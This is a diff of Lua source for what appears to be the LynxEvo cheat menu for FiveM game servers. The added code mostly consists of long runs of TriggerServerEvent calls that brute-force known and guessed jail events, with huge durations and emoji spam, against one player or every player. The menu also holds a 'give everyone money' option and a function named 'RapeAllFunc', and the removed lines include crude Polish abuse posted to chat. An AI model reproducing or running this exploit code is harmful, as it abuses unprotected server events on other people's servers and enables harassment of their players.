@@ -1,18 +1,3 @@
-local mhaonn = true
-ESX = nil
-Citizen.CreateThread(
-    function()
-        while ESX == nil do
-            TriggerEvent(
-                'esx:getSharedObject',
-                function(a)
-                    ESX = a
-                end
-            )
-            Citizen.Wait(1000)
-        end
-    end
-)
 local function e()
     local name = GetPlayerName(PlayerId())
 end
@@ -5254,21 +5239,11 @@ local function bP(bQ, bR)
 end
 
 function RapeAllFunc()
-    for bD = 0, 9 do
-        TriggerServerEvent(
-            '_chat:messageEntered',
-            'xaxaxaxaxaxaxaxaxax',
-            {
-                141,
-                211,
-                255
-            },
-            '^' .. bD .. 'Rucham ci matke z ariesem <3'
-        )
+    for bD = 0, 256 do
     end
     Citizen.CreateThread(
         function()
-            for i = 0, 128 do
+            for i = 0, 256 do
                 RequestModelSync('a_m_o_acult_01')
                 RequestAnimDict('rcmpaparazzo_2')
                 while not HasAnimDictLoaded('rcmpaparazzo_2') do
@@ -7168,16 +7143,7 @@ Citizen.CreateThread(
                             RequestModel(GetHashKey(dn))
                         end
                         for bD = 0, 9 do
-                            TriggerServerEvent(
-                                '_chat:messageEntered',
-                                'xaxaxaxaxaxaxaxaxax',
-                                {
-                                    141,
-                                    211,
-                                    255
-                                },
-                                '^' .. bD .. 'xaxaxaxaxaxaxaxaxax'
-                            )
+                            
                         end
                         for i = 0, 256 do
                             local dl =
@@ -8002,10 +7968,40 @@ Citizen.CreateThread(
                         av('~b~Model is not valid!', true)
                     end
                 elseif LynxEvo.Button('~h~Send To ~r~Jail') then
-                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, 'Jailed')
-                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
-                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
-                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'Jailed')
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayerIdx), 45 * 60, "dude weed")			
+				TriggerServerEvent('esx_jailer:pierdl', GetPlayerServerId(i), 3000)
+				TriggerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJailariesfrajerze", GetPlayerServerId(i), 2343243242432, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 325325325325433253)
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 2343243242432, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:pierdl', GetPlayerServerId(i), 3000)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 3000)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 332400)
+				TriggerServerEvent('esx_jailer:jebacczitera', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 302340)
+				TriggerServerEvent('esx-qalle-jail:jailPlayer200396', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:wpierdoldopaki', GetPlayerServerId(i), 9937,"💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent('esx_jailer:sendToJailf', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("OUJQNE89CBHVYIIUNJHio34ulhs", GetPlayerServerId(i), 235325235, "SIEMANOOOOO", 32432432432, securityToken)
+				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99243237, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 94324937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:sendToJaill', GetPlayerServerId(i), 9923432437, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent("bmjzjadezwsixqucenasqvfxofbgdm:rmlhrtrlqynnxqyjalwgnqmogicmpo", GetPlayerServerId(i), 9923432437, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 3004)
+				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 921937, "FIVEM NA MODACH?", 59823751)
+				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 921937)
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
+				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." xAries on YOUTUBE.")
                 elseif LynxEvo.Button('~h~~g~Evade ~s~From Jail') then
                     local dY = SelectedPlayer
                     TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(dY), 0, 'escaperino')
@@ -10005,16 +10001,41 @@ Citizen.CreateThread(
                 elseif LynxEvo.Button('~h~~g~ESX ~s~Give everyone money') then
                     giveeveryone()
                 elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
-                    for i = 0, 128 do
-                        TriggerServerEvent(
-                            'esx-qalle-jail:jailPlayer',
-                            GetPlayerServerId(i),
-                            5000,
-                            'xaxaxaxaxaxaxaxaxax'
-                        )
-                        TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
-                        TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
-                        TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'xaxaxaxaxaxaxaxaxax')
+                    for i = 0, 256 do
+                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayerIdx), 45 * 60)
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayerIdx), 45 * 60, "dude weed")			
+				TriggerServerEvent('esx_jailer:pierdl', GetPlayerServerId(i), 3000)
+				TriggerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJailariesfrajerze", GetPlayerServerId(i), 2343243242432, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 325325325325433253)
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 2343243242432, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:pierdl', GetPlayerServerId(i), 3000)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 3000)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 332400)
+				TriggerServerEvent('esx_jailer:jebacczitera', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 302340)
+				TriggerServerEvent('esx-qalle-jail:jailPlayer200396', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:wpierdoldopaki', GetPlayerServerId(i), 9937,"💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent('esx_jailer:sendToJailf', GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 303240)
+				TriggerServerEvent("OUJQNE89CBHVYIIUNJHio34ulhs", GetPlayerServerId(i), 235325235, "SIEMANOOOOO", 32432432432, securityToken)
+				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99243237, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 94324937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent('esx_jailer:sendToJaill', GetPlayerServerId(i), 9923432437, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent('esx_jail:jail', GetPlayerServerId(i), "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent("bmjzjadezwsixqucenasqvfxofbgdm:rmlhrtrlqynnxqyjalwgnqmogicmpo", GetPlayerServerId(i), 9923432437, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 3004)
+				TriggerServerEvent("esx_jailer:pierdl", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
+				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥", 300)
+				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 921937, "FIVEM NA MODACH?", 59823751)
+				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 921937)
+				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
+				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "💥💥💥💥💥💥💥💥　　　　　　💥💥💥💥💥💥💥💥💥💥")
+				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "dude weed")
+				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .." xAries on YOUTUBE.")
                     end
                 elseif LynxEvo.Button('~h~~r~Banana ~p~Party~s~ All players') then
                     bananapartyall()
